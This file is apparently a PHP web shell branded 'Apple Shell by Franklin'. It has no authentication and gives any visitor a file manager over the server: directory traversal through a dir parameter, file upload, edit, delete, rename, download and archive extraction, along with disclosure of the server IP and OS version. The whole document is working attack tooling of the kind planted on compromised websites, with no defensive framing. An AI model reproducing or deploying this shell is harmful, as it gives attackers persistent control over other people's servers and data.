<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple Shell by Franklin</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            margin: 20px;
        }
        .container {
            max-width: 1200px;
            margin: auto;
        }
        h1, h2 {
            font-size: 24px;
            text-align: center;
        }
        form, .form-inline {
            margin-bottom: 20px;
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            justify-content: space-between;
        }
        input[type="text"], input[type="file"], input[type="submit"], select, button, textarea {
            padding: 10px;
            margin: 5px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }
        input[type="file"] {
            display: inline-block;
            width: calc(100% - 140px);
        }
        textarea {
            width: 100%;
            height: 200px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 20px;
        }
        table, th, td {
            border: 1px solid #ccc;
        }
        th, td {
            padding: 10px;
            text-align: left;
        }
        th {
            background-color: #f9f9f9;
        }
        th:nth-child(2), td:nth-child(2) {
            width: 300px;
        }
        th:nth-child(3), td:nth-child(3) {
            width: 100px;
        }
        th:nth-child(4), td:nth-child(4) {
            width: 150px;
        }
        .success-message, .error-message {
            font-size: 18px;
            margin-bottom: 20px;
            text-align: center;
        }
        .success-message {
            color: green;
        }
        .error-message {
            color: red;
        }
        .hidden {
            display: none;
        }
        .flex-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .link, .action-link {
            color: #007bff;
            cursor: pointer;
            text-decoration: none;
        }
        .link:hover, .action-link:hover {
            text-decoration: underline;
        }
        .breadcrumb {
            display: flex;
            flex-wrap: wrap;
            list-style: none;
            padding: 0;
            margin: 0 0 20px 0;
        }
        .breadcrumb li {
            margin: 0 5px;
        }
        .breadcrumb li a {
            color: #007bff;
            text-decoration: none;
            cursor: pointer;
        }
        .breadcrumb li a:hover {
            text-decoration: underline;
        }
        .breadcrumb li::after {
            content: '/';
            margin-left: 5px;
        }
        .breadcrumb li:last-child::after {
            content: '';
        }
        .group-box {
            border: 1px solid #ccc;
            padding: 20px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .group-box h3 {
            width: 100%;
            margin-top: 0;
        }
        .operations-container {
            display: flex;
            flex-wrap: wrap;
            justify-content: space-between;
            align-items: center;
        }
        .operations-group {
            flex: 1 1 48%;
            max-width: 48%;
            margin: 10px 0;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .operations-group input[type="text"],
        .operations-group input[type="file"],
        .operations-group input[type="submit"],
        .operations-group select,
        .operations-group button {
            padding: 10px;
            margin: 5px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
            width: 100%;
            box-sizing: border-box;
        }
        .operations-group label {
            width: 100%;
        }
        #edit-container, #rename-container {
            border: 1px solid #ccc;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 5px;
            background-color: #f9f9f9;
        }
        #edit-container.hidden, #rename-container.hidden {
            display: none;
        }
        .full-width {
            width: 100%;
        }
        .form-actions {
            display: flex;
            justify-content: space-between;
            width: 100%;
        }
        @media (max-width: 768px) {
            .operations-group {
                flex: 1 1 100%;
                max-width: 100%;
            }
            .breadcrumb {
                flex-direction: column;
                align-items: flex-start;
            }
            .flex-container {
                flex-direction: column;
                align-items: flex-start;
            }
            .flex-container > div {
                margin-bottom: 10px;
            }
        }
    </style>
</head>
<body>
<div class="container">
    <h1>by FRANKLIN!</h1>
    <?php
    session_start();

    $action = $_POST['action'] ?? '';
    $file = $_POST['file'] ?? '';
    $new_name = $_POST['new_name'] ?? '';
    $dir = $_GET['dir'] ?? getcwd(); // Use current working directory as default
    $upload_files = $_FILES['upload_files']['tmp_name'] ?? [];
    $upload_files_names = $_FILES['upload_files']['name'] ?? [];
    $destination = $_POST['destination'] ?? '';
    $new_folder = $_POST['new_folder'] ?? '';
    $new_file = $_POST['new_file'] ?? '';
    $selected_files = $_POST['selected_files'] ?? [];
    $message = '';
    $file_content = '';
    $copy_file = $_SESSION['copy_file'] ?? null;

    function formatSize($bytes) {
        $sizes = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
        $factor = floor((strlen($bytes) - 1) / 3);
        return sprintf("%.2f", $bytes / pow(1024, $factor)) . ' ' . $sizes[$factor];
    }

    function listFiles($dir)
    {
        $files = scandir($dir);
        echo '<form method="POST" id="file-list-form">';
        echo '<table>';
        echo '<tr><th></th><th>File</th><th>Size</th><th>Type</th><th>Permission</th><th>Date Uploaded</th><th>Action</th></tr>';
        foreach ($files as $file) {
            if ($file !== '.' && $file !== '..') {
                $file_path = $dir . '/' . $file;
                $file_type = is_dir($file_path) ? 'Directory' : pathinfo($file, PATHINFO_EXTENSION);
                echo '<tr>';
                echo '<td><input type="checkbox" name="selected_files[]" value="' . htmlspecialchars($file) . '"></td>';
                if ($file_type === 'Directory') {
                    echo '<td><a href="?dir=' . urlencode($file_path) . '" class="link">' . htmlspecialchars($file) . '</a></td>';
                } else {
                    echo '<td><a href="#" class="link" onclick="editFile(\'' . htmlspecialchars($file) . '\')">' . htmlspecialchars($file) . '</a></td>';
                }
                echo '<td>' . (is_dir($file_path) ? '-' : formatSize(filesize($file_path))) . '</td>';
                echo '<td>' . $file_type . '</td>';
                echo '<td>' . substr(sprintf('%o', fileperms($file_path)), -4) . '</td>';
                echo '<td>' . date("d-m-Y_H:i:s", filemtime($file_path)) . '</td>';
                echo '<td>';
                echo '<a href="#" class="link action-link" onclick="showRenameInput(\'' . htmlspecialchars($file) . '\')">Rename</a> | ';
                echo '<a href="#" class="link action-link" onclick="editFile(\'' . htmlspecialchars($file) . '\')">Edit</a> | ';
                echo '<a href="#" class="link action-link" onclick="performAction(\'delete\', \'' . htmlspecialchars($file) . '\')">Delete</a> | ';
                echo '<a href="' . htmlspecialchars($file_path) . '" download class="link action-link">Download</a>';
                echo '</td>';
                echo '</tr>';
            }
        }
        echo '</table>';
        echo '</form>';
    }

    function performAction($action, $file, $new_name, $dir, $upload_files, $upload_files_names, $destination, $new_folder, $new_file, $selected_files, &$message, &$file_content, &$copy_file)
    {
        switch ($action) {
            case 'upload':
                for ($i = 0; $i < count($upload_files); $i++) {
                    if (move_uploaded_file($upload_files[$i], $dir . '/' . $upload_files_names[$i])) {
                        $message = "File(s) uploaded successfully.";
                    } else {
                        $message = "Failed to upload file(s).";
                    }
                }
                break;
            case 'delete':
                if (unlink($dir . '/' . $file)) {
                    $message = "File deleted successfully.";
                } else {
                    $message = "Failed to delete file.";
                }
                break;
            case 'rename':
                if (rename($dir . '/' . $file, $dir . '/' . $new_name)) {
                    $message = "File renamed successfully.";
                } else {
                    $message = "Failed to rename file.";
                }
                break;
            case 'unzip':
                if (preg_match('/\.zip$/i', $file)) {
                    $zip = new ZipArchive;
                    if ($zip->open($dir . '/' . $file) === TRUE) {
                        $zip->extractTo($dir);
                        $zip->close();
                        $message = "File unzipped successfully.";
                    } else {
                        $message = "Failed to unzip file.";
                    }
                } elseif (preg_match('/\.rar$/i', $file)) {
                    $rar_file = rar_open($dir . '/' . $file);
                    if ($rar_file !== FALSE) {
                        $entries = rar_list($rar_file);
                        foreach ($entries as $entry) {
                            $entry->extract($dir);
                        }
                        rar_close($rar_file);
                        $message = "File unrared successfully.";
                    } else {
                        $message = "Failed to unrar file.";
                    }
                }
                break;
            case 'new_folder':
                if (mkdir($dir . '/' . $new_folder)) {
                    $message = "Folder created successfully.";
                } else {
                    $message = "Failed to create folder.";
                }
                break;
            case 'new_file':
                if (file_put_contents($dir . '/' . $new_file, '') !== false) {
                    $message = "File created successfully.";
                } else {
                    $message = "Failed to create file.";
                }
                break;
            case 'edit':
                if (file_exists($dir . '/' . $file)) {
                    $file_content = file_get_contents($dir . '/' . $file);
                } else {
                    $message = "File does not exist.";
                }
                break;
            case 'save':
                if (file_put_contents($dir . '/' . $file, $file_content) !== false) {
                    $message = "File saved successfully.";
                } else {
                    $message = "Failed to save file.";
                }
                break;
        }
    }

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (isset($_POST['file_content'])) {
            $file_content = $_POST['file_content'];
        }
        performAction($action, $file, $new_name, $dir, $upload_files, $upload_files_names, $destination, $new_folder, $new_file, $selected_files, $message, $file_content, $copy_file);
    }

    function breadcrumb($dir) {
        $parts = explode('/', $dir);
        $breadcrumb = '<ul class="breadcrumb">';
        $path = '';
        foreach ($parts as $part) {
            if ($part === '') continue;
            $path .= '/' . $part;
            $breadcrumb .= '<li><a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($part) . '</a></li>';
        }
        $breadcrumb .= '</ul>';
        echo $breadcrumb;
    }
    ?>

    <?php if ($message): ?>
        <div class="<?php echo strpos($message, 'successfully') !== false ? 'success-message' : 'error-message'; ?>">
            <?php echo htmlspecialchars($message); ?>
        </div>
    <?php endif; ?>

    <div class="flex-container">
        <div>
            <p>Server IP: <?php echo $_SERVER['SERVER_ADDR']; ?></p>
            <p>System: <?php echo php_uname('s') . ' ' . php_uname('r'); ?></p>
            <?php breadcrumb($dir); ?>
        </div>
        <div>
            <button onclick="goBack()">Back</button>
            <button onclick="goForward()">Forward</button>
        </div>
    </div>

    <div id="edit-container" class="<?php echo isset($file_content) && $file_content !== '' ? '' : 'hidden'; ?>">
        <h3>Edit File</h3>
        <form method="POST">
            <input type="text" id="edit-file" name="file" value="<?php echo htmlspecialchars($file); ?>" readonly class="full-width" />
            <textarea id="file-content" name="file_content"><?php echo htmlspecialchars($file_content); ?></textarea>
            <div class="form-actions">
                <input type="submit" value="Save" />
                <button type="button" onclick="closeEditContainer()">Cancel</button>
            </div>
        </form>
    </div>

    <div id="rename-container" class="hidden">
        <h3>Rename File/Folder</h3>
        <form method="POST">
            <input type="text" id="rename-file" name="file" readonly />
            <input type="text" name="new_name" placeholder="New Name" class="full-width" />
            <div class="form-actions">
                <input type="submit" value="Save" />
                <button type="button" onclick="closeRenameContainer()">Cancel</button>
            </div>
        </form>
    </div>

    <h2>File Manager</h2>
    <?php listFiles($dir); ?>

    <div class="group-box">
        <h3>File Operations</h3>
        <div class="operations-container">
            <div class="operations-group">
                <form method="POST" enctype="multipart/form-data">
                    <label for="upload-files">Upload Files:</label>
                    <input type="file" name="upload_files[]" id="upload-files" multiple class="full-width" />
                    <input type="hidden" name="action" value="upload" />
                    <input type="submit" value="Upload a File" />
                </form>
            </div>
            <div class="operations-group">
                <form method="POST">
                    <label for="new-folder">Create New Folder:</label>
                    <input type="text" name="new_folder" placeholder="Folder Name" id="new-folder" class="full-width" />
                    <input type="hidden" name="action" value="new_folder" />
                    <input type="submit" value="Create Folder" />
                </form>
            </div>
            <div class="operations-group">
                <form method="POST">
                    <label for="new-file">Create New File:</label>
                    <input type="text" name="new_file" placeholder="File Name" id="new-file" class="full-width" />
                    <input type="hidden" name="action" value="new_file" />
                    <input type="submit" value="Create File" />
                </form>
            </div>
            <div class="operations-group">
                <form method="POST">
                    <label for="unzip-file">Unzip File:</label>
                    <select name="file" id="unzip-file" class="full-width">
                        <?php
                        $files = scandir($dir);
                        foreach ($files as $file) {
                            if (preg_match('/\.(zip|rar)$/i', $file)) {
                                echo '<option value="' . htmlspecialchars($file) . '">' . htmlspecialchars($file) . '</option>';
                            }
                        }
                        ?>
                    </select>
                    <input type="hidden" name="action" value="unzip" />
                    <input type="submit" value="Unzip" />
                </form>
            </div>
        </div>
    </div>

    <script>
        function performAction(action, file) {
            var form = document.createElement('form');
            form.method = 'POST';
            form.style.display = 'none';
            var actionInput = document.createElement('input');
            actionInput.type = 'hidden';
            actionInput.name = 'action';
            actionInput.value = action;
            form.appendChild(actionInput);
            var fileInput = document.createElement('input');
            fileInput.type = 'hidden';
            fileInput.name = 'file';
            fileInput.value = file;
            form.appendChild(fileInput);
            document.body.appendChild(form);
            form.submit();
        }

        function showRenameInput(file) {
            document.getElementById('rename-container').classList.remove('hidden');
            document.getElementById('rename-file').value = file;
        }

        function editFile(file) {
            var form = document.createElement('form');
            form.method = 'POST';
            form.style.display = 'none';
            var actionInput = document.createElement('input');
            actionInput.type = 'hidden';
            actionInput.name = 'action';
            actionInput.value = 'edit';
            form.appendChild(actionInput);
            var fileInput = document.createElement('input');
            fileInput.type = 'hidden';
            fileInput.name = 'file';
            fileInput.value = file;
            form.appendChild(fileInput);
            document.body.appendChild(form);
            form.submit();
        }

        function closeEditContainer() {
            document.getElementById('edit-container').classList.add('hidden');
        }

        function closeRenameContainer() {
            document.getElementById('rename-container').classList.add('hidden');
        }

        function goBack() {
            window.history.back();
        }

        function goForward() {
            window.history.forward();
        }
    </script>
</div>
</body>
</html>
